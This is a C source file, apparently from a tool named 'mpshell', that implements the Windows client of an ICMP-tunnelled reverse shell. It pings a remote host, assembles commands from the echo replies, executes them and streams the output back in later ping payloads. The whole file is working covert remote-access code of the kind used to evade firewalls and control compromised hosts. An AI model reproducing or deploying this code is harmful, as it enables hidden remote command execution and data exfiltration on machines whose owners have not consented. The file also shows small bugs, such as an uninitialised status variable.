#ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>

#include "mpshell.h"

extern bool RUN;
extern uint16_t maxPayloadSize;
extern DWORD sleepSize;
extern DWORD timeout;

/* --------------------------------------------------------------------------------------------------------------- */

void openICMPChannel(const char *host)
{

    int status;
    ssize_t numBytesReceived;
    unsigned long serverAddress = inet_addr(host);
    HANDLE handle = IcmpCreateFile();
    if (handle == INVALID_HANDLE_VALUE)
    {
        printf("[ERROR] IcmpCreateFile failed => %d\n", status);
        exit(EXIT_FAILURE);
    }


    // Initiating buffers
    // ------------------
    struct CommandBuffer *commandBuffer = (struct CommandBuffer *) malloc(sizeof(struct CommandBuffer));
    commandBuffer->data                 = (unsigned char *) malloc(MAX_COMMAND_SIZE);
    commandBuffer->currentReadPosition  = 0;
    commandBuffer->numBytesOccupied     = 0;
    commandBuffer->numBytesAllocated    = MAX_COMMAND_SIZE;

    struct ResultBuffer *resultBuffer   = (struct ResultBuffer *) malloc(sizeof(struct ResultBuffer));
    resultBuffer->data                  = (unsigned char *) malloc(INITIAL_MALLOC_SIZE);
    resultBuffer->currentReadPosition   = 0;
    resultBuffer->numBytesOccupied      = 0;
    resultBuffer->numBytesAllocated     = INITIAL_MALLOC_SIZE;


    // Initializing packet segments for IN/OUT packets
    // -----------------------------------------------
    unsigned char packetIN[MAX_PACKET_SIZE];
    unsigned char packetOUT[MAX_PACKET_SIZE];

    memset(packetIN, 0, sizeof(packetIN));
    memset(packetOUT, 0, sizeof(packetOUT));

    struct PayloadHeader *headerIN      = (struct PayloadHeader *) packetIN;
    struct PayloadHeader *headerOUT     = (struct PayloadHeader *) packetOUT;

    unsigned char *dataIN               = (packetIN + sizeof(struct PayloadHeader));
    unsigned char *dataOUT              = (packetOUT + sizeof(struct PayloadHeader));

    srand(time(NULL));
    uint16_t randomSessionID            = (uint16_t) (1 + rand()%65535);

    headerOUT->sessionID                = htonl(randomSessionID);
    headerOUT->packetID                 = htonl(1);
    headerOUT->payloadSize              = htons(4);
    /* First packet contains a payload of 4
     * bytes with the desired maxPayloadSize
     */
    uint32_t temp = htonl(maxPayloadSize);
    memcpy(dataOUT, &temp, 4);

    DWORD replySize = sizeof(ICMP_ECHO_REPLY32) + sizeof(packetIN);
    LPVOID replyBuffer = (VOID*) malloc(replySize);
    ZeroMemory(replyBuffer, replySize);


    // Main loop
    // ---------
    while (RUN)
    {

        IcmpSendEcho(handle, serverAddress, packetOUT, (PAYLOAD_HEADER_SIZE + ntohs(headerOUT->payloadSize)), NULL, replyBuffer, replySize, timeout);
        PICMP_ECHO_REPLY32 currentEchoReply = (PICMP_ECHO_REPLY32)replyBuffer;

        if (currentEchoReply->Status != 0)
        {
            Sleep(sleepSize);
            continue;
        }

        numBytesReceived = currentEchoReply->DataSize;
        memcpy(&packetIN[0], (unsigned char *)currentEchoReply->Data, currentEchoReply->DataSize);

        if (numBytesReceived >= sizeof(struct PayloadHeader))
        {
            uint32_t sessionID   = ntohl(headerIN->sessionID);
            uint32_t packetID    = ntohl(headerIN->packetID);
            uint16_t payloadSize = ntohs(headerIN->payloadSize);

            if (headerIN->sessionID != headerOUT->sessionID)
                continue;

            /* This packet is an ACK to last sent packet */
            if (headerIN->packetID == headerOUT->packetID)
            {
                /* Check if there is any data in the packet
                 * and save it to the command buffer
                 */
                if (payloadSize > 0)
                {
                    if ((payloadSize == 5) && (commandBuffer->numBytesOccupied == 0) && ((strcmp(dataIN, "quit") == 0) || (strcmp(dataIN, "exit") == 0)))
                        break;

                    memcpy(&commandBuffer->data[commandBuffer->numBytesOccupied], &dataIN[0], payloadSize);
                    commandBuffer->numBytesOccupied += payloadSize;
                }
                else
                {
                    /* Execute command if it exist
                     * at first next empty packet
                     */
                    if (commandBuffer->numBytesOccupied > 0)
                    {
                        /* Copy the command to a new buffer */
                        char command[MAX_COMMAND_SIZE];
                        memcpy(command, commandBuffer->data, commandBuffer->numBytesOccupied);

                        /* Empty out the command buffer */
                        memset(commandBuffer->data, 0, commandBuffer->numBytesOccupied);
                        commandBuffer->numBytesOccupied = 0;

                        /* Run the command */
                        executeCommand(command, resultBuffer);
                    }

                    /* If there is no command to execute
                     * and the result buffer is empty sleep
                     * for a period defined at command line
                     */
                    else
                    {
                        if (resultBuffer->numBytesOccupied == 0)
                            Sleep(sleepSize);
                    }
                }

                /* ----------------------------------------------------------------------------------------- */

                headerOUT->packetID = htonl(packetID+1);
                if (resultBuffer->numBytesOccupied > maxPayloadSize)
                {
                    headerOUT->payloadSize = htons(maxPayloadSize);
                    memcpy(dataOUT, &resultBuffer->data[resultBuffer->currentReadPosition], maxPayloadSize);
                    resultBuffer->currentReadPosition += maxPayloadSize;
                    resultBuffer->numBytesOccupied    -= maxPayloadSize;
                }
                else if (resultBuffer->numBytesOccupied > 0)
                {
                    headerOUT->payloadSize = htons(resultBuffer->numBytesOccupied);
                    memcpy(dataOUT, &resultBuffer->data[resultBuffer->currentReadPosition], resultBuffer->numBytesOccupied);
                    resultBuffer->currentReadPosition = 0;
                    resultBuffer->numBytesOccupied    = 0;
                }
                else
                {
                    headerOUT->payloadSize = htons(0);
                }
            }
        }
    }

    free(commandBuffer->data);
    free(commandBuffer);
    free(resultBuffer->data);
    free(resultBuffer);
    IcmpCloseHandle(handle);
}

/* --------------------------------------------------------------------------------------------------------------- */
